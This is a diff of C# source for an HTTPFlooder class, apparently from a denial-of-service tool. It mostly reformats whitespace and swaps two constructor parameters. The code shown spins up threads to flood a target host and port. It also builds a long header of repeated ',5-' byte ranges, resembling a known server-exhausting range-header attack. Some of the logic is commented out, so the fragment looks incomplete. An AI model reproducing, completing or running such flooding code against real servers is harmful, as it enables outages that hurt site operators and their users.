@@ -29,8 +29,8 @@ namespace GAS.Core.Attacks {
         private volatile string _attackHeader = "";
         #endregion
         public HTTPFlooder(
-            string dns,
             string ip,
+            string dns,
             int port = 80,
             string subSite = "/",
             bool resp = true,
@@ -41,9 +41,10 @@ namespace GAS.Core.Attacks {
             int threadcount = 1,
             int attacktype = 0,
             int connectionsPerThread = 1 ) {
-            this._buffer = new byte[BUFFER_SIZE];
+
+            this._buffer = new byte[ BUFFER_SIZE ];
             this.ThreadCount = threadcount;
-            this._workingThreads = new Thread[this.ThreadCount];
+            this._workingThreads = new Thread[ this.ThreadCount ];
             this.IsDelayed = false;
             try {
                 this._ip = IPAddress.Parse( ip );
@@ -64,7 +65,7 @@ namespace GAS.Core.Attacks {
             this.Timeout = timeout * 1000;
             this._random = random;
             this._usegZip = usegzip;
-            this.States = new ReqState[this.ThreadCount];
+            this.States = new ReqState[ this.ThreadCount ];
             this._spt = connectionsPerThread;
             this._attacktype = attacktype;
         }
@@ -75,10 +76,10 @@ namespace GAS.Core.Attacks {
             this.IsDelayed = false;
             this.IsFlooding = true;
             var temp = new StringBuilder( 6000 );
-            for (var k = 0; k < 1300; temp.Append( ",5-" + ( k++ ) )) { }
+            for ( var k = 0; k < 1300; temp.Append( ",5-" + ( k++ ) ) ) { }
             this._attackHeader = temp.ToString();
             this._init = false;
-            for (var i = 0; i < this.ThreadCount; i++)
+            for ( var i = 0; i < this.ThreadCount; i++ )
                 ( this._workingThreads[ i ] = new Thread( this.bw_DoWork ) ).Start( i );
             this._init = true;
         }
@@ -92,8 +93,8 @@ namespace GAS.Core.Attacks {
             this._riep = new IPEndPoint(
                 this._ip,
                 this.Port );
-            var fs = new AsyncFlooder[this._spt];
-            for (var i = 0; i < this._spt; i++) //fs[ i ] = new AsyncFlooder(this);
+            var fs = new AsyncFlooder[ this._spt ];
+            for ( var i = 0; i < this._spt; i++ ) //fs[ i ] = new AsyncFlooder(this);
                 fs[ i ].Start();
             Thread.Sleep( System.Threading.Timeout.Infinite );
         }
@@ -146,13 +147,13 @@ namespace GAS.Core.Attacks {
         public override void Stop() {
             this.IsFlooding = false;
             try {
-                foreach (var x in this._workingThreads)
+                foreach ( var x in this._workingThreads )
                     try {
                         x.Abort();
                     }
-                    catch {}
+                    catch { }
             }
-            catch {}
+            catch { }
         }
     }
 }
